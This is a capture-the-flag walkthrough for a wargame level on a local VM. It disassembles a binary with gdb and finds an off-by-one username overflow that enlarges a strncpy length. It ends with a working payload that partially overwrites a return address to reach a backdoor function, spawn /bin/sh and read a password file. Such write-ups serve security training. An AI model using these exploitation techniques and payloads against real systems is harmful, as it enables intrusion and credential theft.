# level09

For now, retrieve the `level09` binary from the VM.

## Connect to level09

Read the password obtained from level08:

```sh
cat level08/flag
```

Connect to the VM:

```sh
ssh level09@127.0.0.1 -p 2222
```

When SSH asks for a password, paste the content of `level08/flag`.

## Get the binary

Copy the ELF binary from the VM:

```sh
scp -P 2222 level09@127.0.0.1:/home/users/level09/level09 ./level09/src/level09
```

Use the content of `level08/flag` as the password.

Verify the downloaded binary:

```sh
file level09/src/level09
```

The local binary should now be:

```text
level09/src/level09
```

## Save `main_dump_gdb`

Inside the level09 SSH session, load the binary using its absolute path:

```sh
gdb ./level09
```

Save the complete disassembly of `main`:

```gdb
set disassembly-flavor intel
set logging file /tmp/level09_main_dump_gdb
set logging overwrite on
set logging on
disas main
set logging off
quit
```

Verify that the dump exists on the VM:

```sh
ls -l /tmp/level09_main_dump_gdb
```

From the repository root on the host, copy it locally:

```sh
scp -P 2222 level09@127.0.0.1:/tmp/level09_main_dump_gdb ./level09/src/main_dump_gdb
```

Use the content of `level08/flag` as the password.

The local files should now be:

```text
level09/src/level09
level09/src/main_dump_gdb
```

## Follow the call from `main`

The level09 `main` function contains only one relevant internal call:

```asm
call 0x8c0 <handle_msg>
```

The next function to save and inspect is therefore `handle_msg`.

## Save `handle_msg_dump_gdb`

Inside the level09 SSH session, load the binary:

```sh
gdb ./level09
```

Save the complete `handle_msg` disassembly:

```gdb
set disassembly-flavor intel
set logging file /tmp/level09_handle_msg_dump_gdb
set logging overwrite on
set logging on
disas handle_msg
set logging off
quit
```

Verify the file on the VM:

```sh
ls -l /tmp/level09_handle_msg_dump_gdb
```

From the repository root on the host, copy it locally:

```sh
scp -P 2222 level09@127.0.0.1:/tmp/level09_handle_msg_dump_gdb ./level09/src/handle_msg_dump_gdb
```

Use the content of `level08/flag` as the password.

## Follow the calls from `handle_msg`

`handle_msg` initializes a local object, then passes its address to two functions in this order:

```asm
call 0x9cd <set_username>
call 0x932 <set_msg>
```

Both functions must be saved and analyzed because they operate on the same object.

## Save `set_username_dump_gdb`

Inside GDB on the level09 VM:

```gdb
set disassembly-flavor intel
set logging file /tmp/level09_set_username_dump_gdb
set logging overwrite on
set logging on
disas set_username
set logging off
quit
```

Verify and copy it from the host:

```sh
ls -l /tmp/level09_set_username_dump_gdb
```

```sh
scp -P 2222 level09@127.0.0.1:/tmp/level09_set_username_dump_gdb ./level09/src/set_username_dump_gdb
```

## Save `set_msg_dump_gdb`

Start GDB again on the level09 VM and save `set_msg`:

```gdb
set disassembly-flavor intel
set logging file /tmp/level09_set_msg_dump_gdb
set logging overwrite on
set logging on
disas set_msg
set logging off
quit
```

Verify and copy it from the host:

```sh
ls -l /tmp/level09_set_msg_dump_gdb
```

```sh
scp -P 2222 level09@127.0.0.1:/tmp/level09_set_msg_dump_gdb ./level09/src/set_msg_dump_gdb
```

Use the content of `level08/flag` as the password for both SCP commands.

## Decode addresses from the message functions

Decode the readable addresses used by `handle_msg`, `set_username`, `set_msg`, and `main`:

```sh
./decode_address level09/src/level09 0xbc0
./decode_address level09/src/level09 0xbcd
./decode_address level09/src/level09 0xbdf
./decode_address level09/src/level09 0xbe4
./decode_address level09/src/level09 0xbfb
./decode_address level09/src/level09 0xc10
```

The output is:

```text
0x0bc0 -> ">: Msg sent!"
0x0bcd -> ">: Msg @Unix-Dude"
0x0bdf -> ">>: "
0x0be4 -> ">: Enter your username"
0x0bfb -> ">: Welcome, %s"
0x0c10 -> "--------------------------------------------\n|   ~Welcome to l33t-m$n ~    v1337        |\n--------------------------------------------"
```

`0x201fb8` is a relocated global entry used to obtain `stdin`; it is not a readable string.

## Reconstruct the message object

`handle_msg` reserves `0xc0` bytes and creates this logical object at `[rbp-0xc0]`:

```text
offset 0x00: message buffer
offset 0x8c: username buffer
offset 0xb4: message length
```

The initial message length is:

```asm
mov DWORD PTR [rbp-0xc],0x8c
```

Because `[rbp-0xc0] + 0xb4` equals `[rbp-0xc]`, the initial permitted message length is `0x8c`, or 140 bytes.

## Identify the one-byte overflow

`set_username` writes into the object starting at offset `0x8c`:

```asm
mov BYTE PTR [rdx+rax+0x8c],cl
```

Its loop continues while the index is less than or equal to `0x28`, so it can copy indexes 0 through 40: 41 bytes in total.

The username field occupies offsets `0x8c` through `0xb3`, exactly 40 bytes. Byte 41 is written at offset `0xb4`, which is the least-significant byte of the message-length field.

Therefore, a username containing 40 filler bytes followed by `0xff` changes the length from:

```text
0x0000008c -> 0x000000ff
```

`set_msg` later reads that field and passes it directly as the length argument to `strncpy`:

```asm
mov    eax,DWORD PTR [rax+0xb4]
movsxd rdx,eax
call   0x720 <strncpy@plt>
```

It can consequently copy 255 bytes into the 140-byte message buffer and overwrite data beyond the object.

## Inspect the functions

The functions gave us nothing, so let's analyze to find something else
The binary is not stripped. List its functions in GDB:

```gdb
info functions
```

The function list contains:

```text
secret_backdoor
```

This function is not called by the normal program flow, so it is the likely return-address target. The next step is to save and inspect its disassembly:

```gdb
set disassembly-flavor intel
set logging file /tmp/level09_secret_backdoor_dump_gdb
set logging overwrite on
set logging on
disas secret_backdoor
set logging off
quit
```

Copy it from the host:

```sh
scp -P 2222 level09@127.0.0.1:/tmp/level09_secret_backdoor_dump_gdb ./level09/src/secret_backdoor_dump_gdb
```

## Analyze `secret_backdoor`

The function contains no readable string address. `0x201fb8` is the relocated entry used to obtain `stdin`, while `0x770` and `0x740` are executable PLT entries for `fgets` and `system`.

Its behavior is equivalent to:

```c
void secret_backdoor(void)
{
    char command[128];

    fgets(command, sizeof(command), stdin);
    system(command);
}
```

Reaching this function allows the next input line to be executed as a shell command.

## Determine the runtime address

The binary is PIE, so `0x88c` is an offset inside the executable, not the complete runtime address. Start the program in GDB:

```sh
gdb ./level09
```

```gdb
set pagination off
break main
run
p/x (void *)secret_backdoor
```

If this older GDB still refuses the cast, use either:

```gdb
info address secret_backdoor
x/i secret_backdoor
```

Run this test more than once and verify whether the address remains stable. A typical address on this VM ends with:

```text
0x488c
```

The saved return address in `handle_msg` normally points back to `main` at offset `0xabd`. Since both addresses share the same PIE base, only the lowest bytes need to be replaced if the runtime base is stable.

## Select the exact copy length

The message buffer begins at `[rbp-0xc0]`, while the saved return address is at `[rbp+0x8]`:

```text
0xc0 + 0x8 = 0xc8 = 200 bytes
```

The return address begins after 200 message bytes. Two additional bytes are needed for a two-byte partial overwrite:

```text
200 + 2 = 202 = 0xca
```

Therefore, use 40 username filler bytes followed by `0xca`. This changes the `strncpy` length to exactly 202 bytes:

```text
username = 40 filler bytes + \xca
message  = 200 filler bytes + two low address bytes
```

Using `0xff` proves that the length can be corrupted, but it copies 255 bytes and would also overwrite the remaining bytes of the saved return address. `0xca` gives the controlled two-byte overwrite needed here.

## Build the final payload

GDB reports the runtime backdoor address as:

```text
secret_backdoor = 0x55555555488c
```

The address can also be confirmed with:

```gdb
info address secret_backdoor
x/i secret_backdoor
```

GDB reports:

```text
Symbol "secret_backdoor" is at 0x55555555488c
0x55555555488c <secret_backdoor>: push %rbp
```

The instruction output confirms that this address is the beginning of executable function code.

The normal return address after `handle_msg` ends with the offset `0xabd`, while the target ends with `0x88c`. Both share the same PIE base:

```text
normal return:   0x555555554abd
secret_backdoor: 0x55555555488c
```

Preserve the upper six bytes and replace only the lowest two bytes. In little-endian order, the replacement is:

```text
0x488c -> \x8c\x48
```

Construct two input lines:

```text
username: 40 x "A" + \xca
message:  200 x "B" + \x8c\x48
```

Run the exploit on the level09 VM and send `/bin/sh` as the command read by `secret_backdoor`:

```sh
(
    python -c 'import sys; sys.stdout.write("A" * 40 + "\xca\n" + "B" * 200 + "\x8c\x48\n")'
    printf '/bin/sh\n'
    cat
) | /home/users/level09/level09
```

The shell reads from a pipe and may not display a prompt. Type:

```sh
whoami
cat /home/users/end/.pass
```

To print the final password directly without opening an interactive shell, use:

```sh
(
    python -c 'import sys; sys.stdout.write("A" * 40 + "\xca\n" + "B" * 200 + "\x8c\x48\n")'
    printf 'cat /home/users/end/.pass\n'
) | /home/users/level09/level09
```
